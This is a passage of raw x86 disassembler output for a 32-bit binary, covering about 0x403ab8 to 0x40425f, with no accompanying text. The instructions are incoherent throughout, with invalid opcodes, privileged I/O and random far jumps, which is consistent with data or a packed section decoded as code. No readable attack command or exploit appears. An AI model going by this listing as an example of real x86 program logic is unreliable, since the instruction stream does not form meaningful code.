  403ab8:	popa   
  403ab9:	ss xchg ecx,eax
  403abb:	out    dx,eax
  403abc:	in     eax,0x83
  403abe:	(bad)
  403ac1:	inc    edi
  403ac2:	jmp    0x403a90
  403ac4:	fimul  WORD PTR [edi+0x36]
  403ac7:	leave  
  403ac8:	mov    al,ds:0x20afc8bd
  403acd:	stos   DWORD PTR es:[edi],eax
  403ace:	add    BYTE PTR [eax],dl
  403ad0:	(bad)  
  403ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ad3:	vpsrad xmm1,xmm1,xmm0
  403ad7:	inc    esi
  403ad8:	inc    eax
  403ad9:	adc    eax,0x411c26
  403ade:	icebp  
  403adf:	push   0x3e
  403ae1:	das    
  403ae2:	daa    
  403ae3:	push   esi
  403ae4:	scas   eax,DWORD PTR es:[edi]
  403ae5:	in     al,dx
  403ae6:	sub    eax,0x8567d635
  403aeb:	push   es
  403aec:	pop    ebp
  403aed:	aaa    
  403aee:	add    al,0x26
  403af0:	push   ecx
  403af1:	and    eax,0x5596c647
  403af6:	mov    edx,0xe290f5e8
  403afb:	cli    
  403afc:	cwde   
  403afd:	jg     0x403b7a
  403aff:	mov    bh,0x42
  403b01:	cdq    
  403b02:	sbb    al,0x43
  403b04:	cmp    eax,0xac05209
  403b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b0a:	ja     0x403b67
  403b0c:	push   es
  403b0d:	adc    BYTE PTR [esi-0x63],bl
  403b10:	aam    0x58
  403b12:	loope  0x403b6a
  403b14:	push   edi
  403b15:	xor    eax,0x50ec29e4
  403b1a:	repnz push 0x4e4fc907
  403b20:	retf   
  403b21:	gs addr16 mov ebx,0xdce1a59a
  403b28:	retf   0x5a5f
  403b2b:	jns    0x403aea
  403b2d:	pop    es
  403b2e:	jbe    0x403ba2
  403b30:	and    al,0xbe
  403b32:	or     DWORD PTR [esi+0x6b3044ed],ecx
  403b38:	cli    
  403b39:	stos   BYTE PTR es:[edi],al
  403b3a:	pop    esi
  403b3b:	sbb    DWORD PTR [ecx],ebx
  403b3d:	pop    eax
  403b3e:	xor    eax,ebp
  403b40:	xchg   edx,eax
  403b41:	jecxz  0x403b1e
  403b43:	test   BYTE PTR [eax+0x3e],cl
  403b46:	push   ss
  403b47:	ins    BYTE PTR es:[edi],dx
  403b48:	xchg   ebp,eax
  403b49:	xchg   DWORD PTR [ecx+ecx*8-0x24824165],edx
  403b50:	cmc    
  403b51:	bound  edi,QWORD PTR [ebx]
  403b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b54:	inc    edi
  403b55:	inc    ebx
  403b56:	cdq    
  403b57:	test   eax,0x2a802f5
  403b5c:	mov    es,WORD PTR [edi+0x18]
  403b5f:	mov    ebx,0xe6121405
  403b64:	or     bh,BYTE PTR [edx+0x13943f4]
  403b6a:	pop    es
  403b6b:	(bad)  
  403b6c:	cmp    al,BYTE PTR [edx-0x4f]
  403b6f:	dec    esp
  403b70:	or     eax,0xc8c68495
  403b75:	cmc    
  403b76:	mov    DWORD PTR [ebx-0x2dd5851f],eax
  403b7c:	or     BYTE PTR [ebp-0x78],ch
  403b7f:	(bad)  cs:[ecx-0x433f70e3]
  403b86:	mov    edx,0x21e5bcf0
  403b8b:	inc    ecx
  403b8c:	ror    DWORD PTR [ecx],0x4a
  403b8f:	das    
  403b90:	test   eax,0x215fd4d2
  403b95:	push   esp
  403b96:	pop    esp
  403b97:	iret   
  403b98:	push   edi
  403b99:	int    0x3e
  403b9b:	cld    
  403b9c:	xor    al,0x67
  403b9e:	shl    DWORD PTR [ecx-0x5d9c5cec],0xc
  403ba5:	mov    ebx,0xb2887dbd
  403baa:	loopne 0x403c08
  403bac:	xchg   edx,eax
  403bad:	neg    BYTE PTR [ecx+0x7d]
  403bb0:	loop   0x403b44
  403bb2:	sbb    eax,DWORD PTR ds:0xfb353cf1
  403bb8:	adc    BYTE PTR [ecx],0xc7
  403bbb:	rol    BYTE PTR [edi],1
  403bbd:	dec    esp
  403bbe:	add    eax,0xc5635389
  403bc3:	add    esp,DWORD PTR [ebp+edx*4+0x38]
  403bc7:	push   ss
  403bc8:	pop    ds
  403bc9:	mov    ah,BYTE PTR [edx-0x5f]
  403bcc:	mov    ds:0x29c1010d,al
  403bd1:	jno    0x403c11
  403bd3:	or     DWORD PTR [esi],0x68
  403bd6:	lods   eax,DWORD PTR ds:[esi]
  403bd7:	leave  
  403bd8:	adc    BYTE PTR ds:[esi],dl
  403bdb:	jle    0x403b88
  403bdd:	and    eax,0x602bc7bc
  403be2:	mov    ebx,0x29c434d1
  403be7:	shr    DWORD PTR [ebp+0x47],1
  403bea:	sbb    al,0x5a
  403bec:	sub    ah,BYTE PTR [ebp-0x4d]
  403bef:	jo     0x403b90
  403bf1:	inc    esi
  403bf2:	cmp    edx,esp
  403bf4:	inc    esi
  403bf5:	pop    ebp
  403bf6:	cld    
  403bf7:	or     eax,0x71184f3f
  403bfc:	jo     0x403bb9
  403bfe:	aad    0x84
  403c00:	xor    BYTE PTR [edx],bl
  403c02:	in     al,dx
  403c03:	sbb    edx,edx
  403c05:	mov    esi,0x438e9bf8
  403c0a:	arpl   WORD PTR [edi],cx
  403c0c:	out    0x5c,al
  403c0e:	mov    al,0xa2
  403c10:	sub    eax,0x364c1c70
  403c15:	pop    ebx
  403c16:	sub    ebp,ecx
  403c18:	mov    ebx,0x42fffbce
  403c1d:	pop    eax
  403c1e:	cmp    esi,DWORD PTR [esi]
  403c20:	add    edx,0x1f
  403c23:	aam    0xc1
  403c25:	fild   WORD PTR [ecx-0x3a4fde5a]
  403c2b:	mov    edx,0xffc09ca7
  403c30:	outs   dx,BYTE PTR ds:[esi]
  403c31:	xchg   BYTE PTR [eax],ah
  403c33:	(bad)  
  403c34:	lahf   
  403c35:	cs mov al,0xf8
  403c38:	icebp  
  403c39:	test   DWORD PTR [ebp+0x46d42b93],esi
  403c3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c40:	cli    
  403c41:	inc    ebx
  403c42:	into   
  403c43:	(bad)  
  403c44:	mov    BYTE PTR [edx],al
  403c46:	jbe    0x403c02
  403c48:	add    al,BYTE PTR [ebx+0x4a]
  403c4b:	pop    ebx
  403c4c:	pop    esp
  403c4d:	push   ebx
  403c4e:	xchg   edi,eax
  403c4f:	js     0x403be2
  403c51:	jno    0x403c75
  403c53:	or     al,0xba
  403c55:	jbe    0x403c20
  403c57:	cwde   
  403c58:	cwde   
  403c59:	mov    edi,DWORD PTR [ecx]
  403c5b:	cs repnz test eax,0x470de80
  403c62:	retf   
  403c63:	mov    ecx,0xe303d3cd
  403c68:	loop   0x403cc9
  403c6a:	call   0x6703dae7
  403c6f:	test   ebp,esi
  403c71:	mov    ebx,0xba26f2e2
  403c76:	inc    esi
  403c77:	or     BYTE PTR [eax+0x47],dh
  403c7a:	pop    ebx
  403c7b:	test   BYTE PTR [eax],dl
  403c7d:	loopne 0x403c9d
  403c7f:	(bad)  
  403c80:	repnz int 0xa7
  403c83:	mov    bl,0x3a
  403c85:	in     eax,dx
  403c86:	push   ds
  403c87:	xchg   edi,eax
  403c88:	lock inc ebx
  403c8a:	mov    BYTE PTR [ebp+0x7d44f049],bl
  403c90:	jb     0x403c5b
  403c92:	mov    eax,ds:0xe75f526c
  403c97:	cwde   
  403c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c99:	iret   
  403c9a:	sar    edx,0xe0
  403c9d:	mov    DWORD PTR [edx-0x79],eax
  403ca0:	lods   al,BYTE PTR ds:[esi]
  403ca1:	ror    al,cl
  403ca3:	scas   eax,DWORD PTR es:[edi]
  403ca4:	aas    
  403ca5:	aad    0x77
  403ca7:	dec    ebp
  403ca8:	fadd   DWORD PTR [ecx+eiz*2+0x4e]
  403cac:	retf   0x15a4
  403caf:	lar    ebp,WORD PTR [eax]
  403cb2:	push   esp
  403cb3:	mov    ds:0xbdeddcc,eax
  403cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cb9:	mov    dh,0x72
  403cbb:	jmp    0x403c5d
  403cbd:	sub    ebp,DWORD PTR cs:[esi]
  403cc0:	mov    ebp,0xa7fe29f3
  403cc5:	xor    DWORD PTR [eax+0x68fe6a90],edx
  403ccb:	dec    esi
  403ccc:	stc    
  403ccd:	sub    eax,0x6aa4e3e5
  403cd2:	pop    esp
  403cd3:	pop    edi
  403cd4:	jge    0x403c7b
  403cd6:	(bad)  
  403cd8:	(bad)  
  403cd9:	retw   0x3fce
  403cdd:	or     al,0x26
  403cdf:	aad    0xa
  403ce1:	dec    esp
  403ce2:	sbb    al,0x52
  403ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ce5:	pop    esp
  403ce6:	int3   
  403ce7:	jmp    0x9c55:0xca9d1e10
  403cee:	xor    BYTE PTR [edx-0x25],0x3f
  403cf2:	add    DWORD PTR [edi+0x44],0x12
  403cf6:	jnp    0x403cb6
  403cf8:	xor    edx,ebp
  403cfa:	push   esi
  403cfb:	repnz mov cl,0xa
  403cfe:	xlat   BYTE PTR ds:[ebx]
  403cff:	push   ss
  403d00:	call   0xd5cb566
  403d05:	pop    ss
  403d06:	or     DWORD PTR [eax],eax
  403d08:	shl    BYTE PTR [eax],cl
  403d0a:	add    cl,al
  403d0c:	dec    ebp
  403d0d:	jno    0x403d48
  403d0f:	retf   
  403d10:	and    esi,DWORD PTR [eax+0x16]
  403d13:	shl    BYTE PTR [ebx-0x71c407a5],0x95
  403d1a:	pop    ecx
  403d1b:	jae    0x403d26
  403d1d:	or     al,0x34
  403d1f:	pop    ecx
  403d20:	std    
  403d21:	pop    esi
  403d22:	sub    DWORD PTR [eax],ebp
  403d24:	add    DWORD PTR [ebp-0x4931f013],ecx
  403d2a:	ja     0x403cd9
  403d2c:	std    
  403d2d:	hlt    
  403d2e:	fcomi  st,st(2)
  403d30:	inc    ecx
  403d31:	and    ebx,DWORD PTR [edx]
  403d33:	mov    dl,0x8a
  403d35:	pop    edi
  403d36:	dec    ebx
  403d37:	(bad)  
  403d38:	jne    0x403cd9
  403d3a:	ja     0x403d4a
  403d3c:	push   esp
  403d3d:	mov    ebp,0x2857b8e0
  403d42:	pop    edi
  403d43:	std    
  403d44:	mov    dh,0x83
  403d46:	mov    ebx,0xdc951680
  403d4b:	xchg   esp,eax
  403d4c:	dec    ebx
  403d4d:	xchg   ebx,eax
  403d4e:	or     BYTE PTR [ebx+0x5e43c0f8],dl
  403d54:	ja     0x403dad
  403d56:	out    dx,al
  403d57:	mov    bh,0x49
  403d59:	pop    esi
  403d5a:	fadd   st(3),st
  403d5c:	sub    DWORD PTR [ecx-0x9],edi
  403d5f:	div    dh
  403d61:	mov    al,0x76
  403d63:	test   eax,0xd78be4ca
  403d68:	cmp    BYTE PTR [edx+ebx*4-0x72f95039],dh
  403d6f:	fsubr  QWORD PTR [eax+0x229c5651]
  403d75:	je     0x403d32
  403d77:	fwait
  403d78:	mov    ds:0x57c2d86e,eax
  403d7d:	jl     0x403d2c
  403d7f:	xor    ch,BYTE PTR [ecx-0x285b2027]
  403d85:	mov    ss,WORD PTR [eax+0xf853732]
  403d8b:	add    dl,BYTE PTR [ecx]
  403d8d:	loope  0x403d65
  403d8f:	test   eax,0x8fcb2874
  403d94:	sub    BYTE PTR [edi+0x1c],ch
  403d97:	dec    esi
  403d98:	xchg   ecx,eax
  403d99:	xchg   BYTE PTR [esp+esi*8-0xd],bh
  403d9d:	sbb    eax,0x912a8b32
  403da2:	into   
  403da3:	js     0x403da6
  403da5:	fnclex 
  403da7:	jmp    0xb45b:0x8167c579
  403dae:	jns    0x403dda
  403db0:	rol    BYTE PTR es:[edi+0x6530092],1
  403db7:	mov    ebp,0xda9dee2b
  403dbc:	(bad)  
  403dbd:	mov    es,WORD PTR [ebx+esi*1]
  403dc0:	bound  edi,QWORD PTR [eax+0x2dd86ea]
  403dc6:	(bad)  
  403dc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dc8:	add    BYTE PTR [ebp+0x3411ef27],bh
  403dce:	out    dx,eax
  403dcf:	int    0xa4
  403dd1:	mov    dh,ah
  403dd3:	leave  
  403dd4:	sub    BYTE PTR [ecx],bl
  403dd6:	enter  0x6034,0x9e
  403dda:	inc    ecx
  403ddb:	xlat   BYTE PTR ds:[ebx]
  403ddc:	sahf   
  403ddd:	aad    0x16
  403ddf:	test   DWORD PTR [ebx+0x4d],0x1cba83f0
  403de6:	push   ebp
  403de7:	sub    ah,cl
  403de9:	cmp    eax,0x6756acf9
  403dee:	loop   0x403e5a
  403df0:	mov    esi,gs
  403df2:	xchg   BYTE PTR [eax-0x7a],dh
  403df5:	push   esp
  403df6:	aad    0x5b
  403df8:	pop    ecx
  403df9:	xchg   BYTE PTR [eax-0x3c],al
  403dfc:	inc    eax
  403dfd:	sub    BYTE PTR [ebx-0x47],bh
  403e00:	cmp    bl,BYTE PTR [edx-0x19]
  403e03:	inc    ecx
  403e04:	xlat   BYTE PTR ds:[ebx]
  403e05:	push   ebx
  403e06:	xchg   ecx,eax
  403e07:	out    0x4a,al
  403e09:	mov    al,0x74
  403e0b:	and    al,0xac
  403e0d:	imul   BYTE PTR [edx]
  403e0f:	xchg   dh,bh
  403e11:	push   0xffffffd9
  403e13:	fcmovnb st,st(2)
  403e15:	fld    st(1)
  403e17:	sub    al,0xfa
  403e19:	daa    
  403e1a:	push   esi
  403e1b:	out    dx,al
  403e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e1d:	js     0x403e20
  403e1f:	rcl    BYTE PTR [eax],cl
  403e21:	pop    edi
  403e22:	inc    ebx
  403e23:	clc    
  403e24:	daa    
  403e25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e26:	xlat   BYTE PTR ds:[ebx]
  403e27:	fmul   QWORD PTR [edx]
  403e29:	test   al,0x99
  403e2b:	adc    DWORD PTR es:[esi+0x1f561a4b],edi
  403e32:	ret    0x4fce
  403e35:	lock cld 
  403e37:	test   BYTE PTR [edx+edi*1+0x4f],ah
  403e3b:	adc    al,0x71
  403e3d:	inc    ebp
  403e3e:	(bad)  
  403e3f:	stc    
  403e40:	lods   al,BYTE PTR ds:[esi]
  403e41:	fild   DWORD PTR [esi+eiz*1]
  403e44:	in     al,0xb1
  403e46:	xor    al,0x40
  403e48:	xchg   esp,eax
  403e49:	(bad)  
  403e4a:	jecxz  0x403e8f
  403e4c:	adc    DWORD PTR [ecx-0x40],0x3b
  403e50:	cmp    eax,0x47e3e85
  403e55:	pop    esp
  403e56:	fcmovbe st,st(6)
  403e58:	repz sahf 
  403e5a:	xchg   ecx,eax
  403e5b:	sbb    DWORD PTR [edi+0x74f911d5],esi
  403e61:	inc    esp
  403e62:	stos   BYTE PTR es:[edi],al
  403e63:	inc    edi
  403e64:	jb     0x403e52
  403e66:	pop    eax
  403e67:	shl    dl,0xfb
  403e6a:	neg    BYTE PTR [edx+ecx*2-0x1f]
  403e6e:	or     al,0xc2
  403e70:	je     0x403ee6
  403e72:	jmp    0x403df8
  403e74:	ret    0x659b
  403e77:	aas    
  403e78:	inc    eax
  403e79:	and    edi,DWORD PTR [esi+0x22fe9da]
  403e7f:	imul   DWORD PTR [ecx]
  403e81:	lea    edx,[edi+0x66bb8045]
  403e87:	in     al,0xf
  403e89:	push   edi
  403e8a:	sahf   
  403e8b:	jmp    0x403e87
  403e8d:	mul    DWORD PTR [edx]
  403e8f:	xor    edi,DWORD PTR [eax-0x5e16ecad]
  403e95:	sbb    al,0x4b
  403e97:	mov    al,ds:0x4b7d2dd0
  403e9c:	fdiv   st,st(4)
  403e9e:	sub    al,0xa0
  403ea0:	out    dx,eax
  403ea1:	mov    ch,BYTE PTR [esi]
  403ea3:	jb     0x403e8a
  403ea5:	xchg   edx,eax
  403ea6:	div    DWORD PTR ds:0xc081534f
  403eac:	les    edx,FWORD PTR [edi]
  403eae:	jmp    0x403ef6
  403eb0:	popf   
  403eb1:	ret    0x9632
  403eb4:	int    0xd0
  403eb6:	bswap  eax
  403eb8:	imul   esi,DWORD PTR [ebx-0x5b],0xfa1f04c2
  403ebf:	hlt    
  403ec0:	aas    
  403ec1:	sub    al,0x2b
  403ec3:	outs   dx,BYTE PTR ds:[esi]
  403ec4:	pop    ebp
  403ec5:	pop    ss
  403ec6:	lea    ecx,[eax+0x3f]
  403ec9:	in     eax,0x81
  403ecb:	inc    ebx
  403ecc:	test   DWORD PTR [ebx+0x6377af2b],ebp
  403ed2:	mov    ds:0x30f7686d,al
  403ed7:	loop   0x403f23
  403ed9:	js     0x403ee2
  403edb:	pop    ds
  403edc:	scas   eax,DWORD PTR es:[edi]
  403edd:	xor    al,0x77
  403edf:	xor    dh,BYTE PTR [eax]
  403ee1:	inc    ebx
  403ee2:	dec    esi
  403ee3:	add    al,0x89
  403ee5:	fwait
  403ee6:	repz sub BYTE PTR ds:0x9dd12196,ah
  403eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403eee:	mov    ch,0xd3
  403ef0:	in     eax,dx
  403ef1:	or     esi,0xb
  403ef4:	pop    ebp
  403ef5:	jmp    0x21fd:0xd2a743a8
  403efc:	mov    esp,DWORD PTR [edx-0x16]
  403eff:	fnstcw WORD PTR [esi]
  403f01:	lahf   
  403f02:	fild   WORD PTR [edi]
  403f04:	ins    DWORD PTR es:[edi],dx
  403f05:	sbb    eax,0x32958500
  403f0a:	or     DWORD PTR [esi+0x43],eax
  403f0d:	fstp   TBYTE PTR [eax]
  403f0f:	or     ecx,ebp
  403f11:	xlat   BYTE PTR ds:[ebx]
  403f12:	mov    eax,0x5032f6f6
  403f17:	mov    bh,0x8a
  403f19:	or     ecx,DWORD PTR [edx]
  403f1b:	sub    BYTE PTR [edx-0x7b610313],ch
  403f21:	and    DWORD PTR [eax+0x7b],ebx
  403f24:	mov    edi,0x2e945f0b
  403f29:	mov    dh,0xaf
  403f2b:	es mov eax,0x86a8161f
  403f31:	outs   dx,DWORD PTR ds:[esi]
  403f32:	imul   edi,DWORD PTR [eax-0x67],0x4b
  403f36:	sub    BYTE PTR [eax+0x1e9305c8],dl
  403f3c:	aad    0x1
  403f3e:	fadd   DWORD PTR ds:0xa90048fb
  403f44:	arpl   WORD PTR [esp+ecx*4-0x4fb6faac],cx
  403f4b:	or     bl,BYTE PTR [eax+0x4b]
  403f4e:	repz inc edi
  403f50:	lds    ecx,FWORD PTR [ebx+0x49]
  403f53:	xchg   esp,eax
  403f54:	stc    
  403f55:	lea    ebp,[ecx+0x201da4d0]
  403f5b:	push   esp
  403f5c:	or     BYTE PTR [ebp-0x5],0xb1
  403f60:	imul   edx,DWORD PTR [esi+0x24811767],0x315c2efd
  403f6a:	pop    esi
  403f6b:	xor    al,0x7e
  403f6d:	and    edi,DWORD PTR [eax]
  403f6f:	out    dx,al
  403f70:	stc    
  403f71:	jno    0x403f33
  403f73:	and    BYTE PTR [ebx+0x60],0x5a
  403f77:	fmul   QWORD PTR [esi+0x1b40426d]
  403f7d:	and    BYTE PTR [edi+0x15978cdc],0xcb
  403f84:	mov    ah,0xbd
  403f86:	cmp    eax,0xeb44f422
  403f8b:	add    al,0x8f
  403f8d:	cmp    BYTE PTR [edi-0x3d1df592],ah
  403f93:	inc    eax
  403f94:	(bad)  
  403f95:	mov    eax,0x2cfcb073
  403f9a:	imul   eax,DWORD PTR [eax],0x50
  403f9d:	in     eax,dx
  403f9e:	gs inc ebx
  403fa0:	ret    
  403fa1:	in     al,dx
  403fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fa3:	test   eax,0xe45aeda4
  403fa8:	xchg   ebp,eax
  403fa9:	push   ds
  403faa:	fstp   TBYTE PTR [esp+eax*4+0x21]
  403fae:	mov    dl,0x80
  403fb0:	jmp    0xfd11:0xa102e88b
  403fb7:	rol    bh,1
  403fb9:	int    0x52
  403fbb:	ins    BYTE PTR es:[edi],dx
  403fbc:	int3   
  403fbd:	or     BYTE PTR [edi-0x6165e0f7],dl
  403fc3:	xor    BYTE PTR [ecx+eax*2+0x57e8a6c1],cl
  403fca:	aam    0x6b
  403fcc:	aad    0xad
  403fce:	push   ss
  403fcf:	not    DWORD PTR [ebx-0x6]
  403fd2:	pop    edi
  403fd3:	mov    cl,0x92
  403fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fd6:	outs   dx,BYTE PTR ds:[esi]
  403fd7:	test   BYTE PTR [edi],al
  403fd9:	es test ebx,esi
  403fdc:	xor    ecx,DWORD PTR [esi-0x74]
  403fdf:	pop    ds
  403fe0:	lahf   
  403fe1:	ins    BYTE PTR es:[edi],dx
  403fe2:	test   al,0xc8
  403fe4:	jmp    0x403f99
  403fe6:	(bad)  
  403fe7:	out    0xd3,al
  403fe9:	add    DWORD PTR [edx-0x58df4a1d],esi
  403fef:	push   esp
  403ff0:	mov    al,ds:0xbad0edce
  403ff5:	or     eax,0xbf65bffe
  403ffa:	inc    esi
  403ffb:	loopne 0x404050
  403ffd:	iret   
  403ffe:	outs   dx,BYTE PTR ds:[esi]
  403fff:	enter  0xc729,0xb3
  404003:	jmp    0x403fbb
  404005:	pop    eax
  404006:	(bad)  
  404007:	imul   ecx,eax,0xffffff9e
  40400a:	call   0xd66a7c70
  40400f:	xor    edx,DWORD PTR ds:0x4b9ad650
  404015:	jle    0x40407c
  404017:	jecxz  0x40402e
  404019:	sub    esi,DWORD PTR ds:0x7e653f2f
  40401f:	ja     0x403fcc
  404021:	xchg   esp,eax
  404022:	mov    esp,0xbe095705
  404027:	pop    ss
  404028:	jmp    0x633a:0x3c7293ea
  40402f:	sub    BYTE PTR [esi],ch
  404031:	inc    esp
  404032:	ret    
  404033:	cs push ecx
  404035:	mov    dh,0xca
  404037:	fsubr  QWORD PTR [ebx]
  404039:	pop    ss
  40403a:	push   cs
  40403b:	jge    0x404038
  40403d:	rcr    BYTE PTR [esp+ebp*2],0x1a
  404041:	mov    esp,DWORD PTR [esi]
  404043:	push   0x2b
  404045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404046:	adc    edx,DWORD PTR [edx-0x737e84a1]
  40404c:	sub    bh,BYTE PTR [ecx+0x7b5dfdb0]
  404052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404053:	in     eax,0x1c
  404055:	popf   
  404056:	test   edx,edx
  404058:	aaa    
  404059:	xlat   BYTE PTR ds:[ebx]
  40405a:	iret   
  40405b:	and    esi,esp
  40405d:	pop    ebp
  40405e:	sbb    eax,0xcacb2107
  404063:	mov    eax,ds:0x2363b80c
  404068:	add    ah,BYTE PTR [edx]
  40406a:	lock adc ebp,eax
  40406d:	cld    
  40406e:	int    0xd1
  404070:	fidivr DWORD PTR [eax+0x20]
  404073:	stos   BYTE PTR es:[edi],al
  404074:	inc    edx
  404075:	push   eax
  404076:	out    0xff,eax
  404078:	dec    edi
  404079:	fmul   QWORD PTR [eax-0x49]
  40407c:	aas    
  40407d:	repnz add DWORD PTR [ebx],ebp
  404080:	jge    0x40406f
  404082:	dec    ecx
  404083:	test   BYTE PTR [eax],ch
  404085:	dec    edx
  404086:	jmp    0x7c2:0xdedda3cb
  40408d:	lods   eax,DWORD PTR ds:[esi]
  40408e:	into   
  40408f:	dec    ecx
  404090:	xchg   esp,eax
  404091:	pop    DWORD PTR [edx-0x2d]
  404094:	dec    ecx
  404095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404096:	cmc    
  404097:	ins    DWORD PTR es:[edi],dx
  404098:	int3   
  404099:	push   ebx
  40409a:	or     al,0xe0
  40409c:	mov    BYTE PTR [ebx+0x15489ffe],ah
  4040a2:	test   BYTE PTR [ebp-0x49b51b18],cl
  4040a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040a9:	add    eax,DWORD PTR [ebp+0x253cfb9b]
  4040af:	pop    esi
  4040b0:	scas   eax,DWORD PTR es:[edi]
  4040b1:	cmp    al,0x73
  4040b3:	pop    edx
  4040b4:	aas    
  4040b5:	std    
  4040b6:	idiv   ah
  4040b8:	js     0x404098
  4040ba:	stos   BYTE PTR es:[edi],al
  4040bb:	sub    si,WORD PTR [eax-0x5912b5ac]
  4040c2:	cmp    esi,edx
  4040c4:	out    0x6e,eax
  4040c6:	(bad)
  4040ca:	sbb    esp,eax
  4040cc:	dec    BYTE PTR [edi-0x73]
  4040cf:	call   0x777d:0x718d343f
  4040d6:	pop    edx
  4040d7:	xchg   ebx,eax
  4040d8:	cdq    
  4040d9:	jecxz  0x404096
  4040db:	or     al,0x9e
  4040dd:	fwait
  4040de:	stos   DWORD PTR es:[edi],eax
  4040df:	shr    BYTE PTR [ebx+0x6c],cl
  4040e2:	mov    ebp,0x60973dd7
  4040e7:	mov    ch,0x86
  4040e9:	mov    WORD PTR [ecx+0x3aa2dcc9],cs
  4040ef:	or     al,0x0
  4040f1:	aad    0xfb
  4040f3:	addr16 jg 0x40410b
  4040f6:	jns    0x4040f4
  4040f8:	loop   0x4040a8
  4040fa:	test   eax,0xefbcfd0d
  4040ff:	fist   WORD PTR [ecx-0x56]
  404102:	sbb    esp,eax
  404104:	mov    ds:0x99d09a76,al
  404109:	cmp    al,0x52
  40410b:	xor    DWORD PTR [eax],eax
  40410d:	ins    BYTE PTR es:[edi],dx
  40410e:	inc    edi
  40410f:	inc    ebp
  404110:	int3   
  404111:	xor    cl,dl
  404113:	xor    ah,al
  404115:	clc    
  404116:	xchg   ebp,eax
  404117:	xor    BYTE PTR [edi-0x57],dh
  40411a:	and    DWORD PTR [ecx+0x2a6505eb],edi
  404120:	enter  0xc218,0x80
  404124:	mov    cl,0xed
  404126:	in     eax,dx
  404127:	out    dx,al
  404128:	cvtpi2ps xmm6,QWORD PTR [edi]
  40412b:	hlt    
  40412c:	in     eax,0xf0
  40412e:	jo     0x40416b
  404130:	aam    0xa
  404132:	fs and eax,0xe8dff13
  404138:	dec    ecx
  404139:	pop    ecx
  40413a:	adc    BYTE PTR [esi-0x71],dh
  40413d:	adc    al,0xcd
  40413f:	shl    BYTE PTR [esi],cl
  404141:	sub    ah,0x1f
  404144:	retf   
  404145:	or     eax,0xfaa54406
  40414a:	stos   DWORD PTR es:[edi],eax
  40414b:	adc    eax,0xcd562c17
  404150:	push   esi
  404151:	mov    esp,DWORD PTR [eax]
  404153:	xchg   esi,eax
  404154:	ss aad 0x8
  404157:	mov    eax,0x3af14f0
  40415c:	jbe    0x404155
  40415e:	int    0x2d
  404160:	fimul  DWORD PTR [ebp+esi*8-0x76505fd3]
  404167:	sub    dl,bl
  404169:	or     esp,DWORD PTR [ecx]
  40416b:	fisub  WORD PTR [ebx+0x73a6d645]
  404171:	call   0x3e9d1893
  404176:	sar    bh,1
  404178:	cli    
  404179:	addr16 push ebp
  40417b:	adc    esp,DWORD PTR [ecx]
  40417d:	mov    BYTE PTR [edi-0x33],bl
  404180:	mov    ebp,0x5f75087e
  404185:	mov    ds:0x96f2e65f,eax
  40418a:	pushf  
  40418b:	ds xor eax,0x6766988a
  404191:	pop    es
  404192:	and    al,0x2c
  404194:	sbb    DWORD PTR [ebx],eax
  404196:	jle    0x40413c
  404198:	push   0xffffffbf
  40419a:	push   ds
  40419b:	mov    edx,0x7cb82c16
  4041a0:	fcom   DWORD PTR [ecx+0x73494beb]
  4041a6:	sti    
  4041a7:	outs   dx,DWORD PTR ds:[esi]
  4041a8:	in     al,dx
  4041a9:	ss push edi
  4041ab:	pop    esp
  4041ac:	push   ebx
  4041ad:	pop    ss
  4041ae:	pop    ecx
  4041af:	dec    ebx
  4041b0:	push   edx
  4041b1:	into   
  4041b2:	jecxz  0x4041aa
  4041b4:	repz test al,0xc0
  4041b8:	ror    BYTE PTR ds:0xc50085be,1
  4041be:	xlat   BYTE PTR ds:[ebx]
  4041bf:	sub    ebx,DWORD PTR [ebp-0x104e97d6]
  4041c5:	aas    
  4041c6:	lahf   
  4041c7:	push   ds
  4041c8:	pop    ebp
  4041c9:	jmp    0x67cf:0x30baa404
  4041d0:	or     DWORD PTR [edi+0x79a69764],ebx
  4041d6:	les    eax,FWORD PTR [edi+ecx*8-0x23]
  4041da:	mov    esp,0x60a50e22
  4041df:	mov    edi,0xd4cd889f
  4041e4:	jge    0x404178
  4041e6:	call   0xa546:0x178a92f8
  4041ed:	or     bl,BYTE PTR [ecx-0x146f541f]
  4041f3:	jmp    0x40422a
  4041f5:	les    esi,FWORD PTR [eax-0x3bae4c5a]
  4041fb:	mov    ch,0xbe
  4041fd:	imul   esi,DWORD PTR [ebx+edx*2+0x6a],0xffffff97
  404202:	jmp    0x404210
  404204:	popf   
  404205:	mov    ecx,0x86ed753b
  40420a:	xor    DWORD PTR [esi-0x7b5cd389],eax
  404210:	repz push es
  404212:	dec    ebx
  404213:	ror    BYTE PTR [edx-0x6a],cl
  404216:	mov    fs,WORD PTR [ebp-0x2f]
  404219:	mov    eax,ds:0x31c2b48c
  40421e:	dec    ecx
  40421f:	mov    edi,0x567b9278
  404224:	jge    0x4041d2
  404226:	shl    BYTE PTR [edx+eax*4],1
  404229:	ror    al,cl
  40422b:	cmp    eax,0xbabd7de3
  404230:	adc    BYTE PTR [ebp+0x6a403bd3],dl
  404236:	retf   0xea14
  404239:	ds jmp 0x4042a7
  40423c:	mov    ch,0xd2
  40423e:	sbb    al,0x18
  404240:	and    eax,0xc6a3755d
  404245:	pop    ss
  404246:	(bad)  
  404247:	and    al,0x46
  404249:	mov    bh,0x98
  40424b:	and    BYTE PTR [edi],bh
  40424d:	jno    0x404233
  40424f:	fs js  0x40422e
  404252:	dec    esi
  404253:	jmp    0x8e53bc71
  404258:	push   ecx
  404259:	repz add ebp,DWORD PTR [ebx*8+0x381796c8]
